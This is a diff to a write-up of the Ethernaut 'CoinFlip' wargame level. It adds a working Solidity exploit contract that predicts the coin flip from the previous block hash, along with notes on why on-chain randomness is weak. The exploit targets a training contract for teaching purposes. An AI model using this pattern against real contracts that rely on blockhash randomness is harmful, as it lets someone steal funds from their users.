@@ -22,7 +22,7 @@ If the contract's `flip` function were truly random, this level would be impossi
 
 <summary>Hint Two</summary>
 
-The outcome of each coin flip is purely a function of the hash of the last mined block. The hash is divided by a constant `FACTOR` and whether this quotient `== 1` determines the result. We will need to script the calculation of this value ourselves prior to each "guess" transaction. This may even be implemented in a smart contract of our own!
+The outcome of each coin flip is purely a function of the hash of the last mined block. The hash is divided by a constant `FACTOR` and whether this quotient `== 1` determines the result. We will need to script the calculation of this value ourselves prior to each "guess" transaction. This can be implemented in a smart contract of our own!
 
 </details>
 
@@ -58,19 +58,47 @@ function flip(bool _guess) public returns (bool) {
 
 As we can determine the `blockValue` before calling the contract's `flip` function, we simply need to implement our own matching flip function to calculate our "guess" in advance of each transaction.
 
-{% hint style="info" %}
-**How does the math work?**
+We'll write our own "proxy contract" in Solidity to handle calculating the outcome of the coin flip and then calling the `flip` function on the `CoinFlip` contract. Our contract will contain a `guess` function that will just need to be called ten times in a row. The approach below will always work as we will be executing both the calculation of our guess and the result of the `flip` function at once, meaning everything will be included in the same block so both contracts will have the same value of `block.number` (the current block height in which the transaction is being mined).
 
-Coming soon...
+{% hint style="info" %}
+**Global Variables and Global Functions**
+
+We see both `block.number` and `blockHash` are accessible from within the smart contracts without being defined. This is because Solidity makes a number of useful variables and functions globally available. You can learn more in the Solidity [documentation](https://docs.soliditylang.org/en/v0.8.10/units-and-global-variables.html).
 {% endhint %}
 
 ### Scripted Solution
 
-```javascript
-// Some code
+```solidity
+pragma solidity ^0.8.0;
+
+import "./CoinFlip.sol";
+
+contract CoinFlipExploit {
+    CoinFlip public coinFlipContract;
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    /**
+     * @dev Sets `coinFlipContract` to instance at `coinFlipContractAddress`.
+     */
+    constructor(address coinFlipContractAddress) {
+        coinFlipContract = CoinFlip(coinFlipContractAddress);
+    }
+
+    /**
+     * @dev Calls the CoinFlip contract's `flip` function with the correct guess.
+     */
+    function guess() public {
+        uint256 previousBlockHash = uint256(blockhash(block.number - 1));
+        bool side = (previousBlockHash / FACTOR) == 1 ? true : false;
+
+        coinFlipContract.flip(side);
+    }
+}
 ```
 
 ### Key Takeaways
 
-* Generating sufficiently random data is a challenge on a _**deterministic**_** blockchain** and is a problem best left to industry standard solutions like the Chainlink oracle's "Verifiable Random Function".
+* Generating sufficiently random data is a challenge on a _**deterministic**_\*\* blockchain\*\* and is a problem best left to industry standard solutions like the Chainlink oracle's "Verifiable Random Function".
 * Smart contracts on public blockchains are auditable by anyone. Any attempts to hide clever tricks in a contract's code are therefor ultimately futile.
+* Solidity contains a number of useful globally available variables and functions we can use when writing our own contracts.
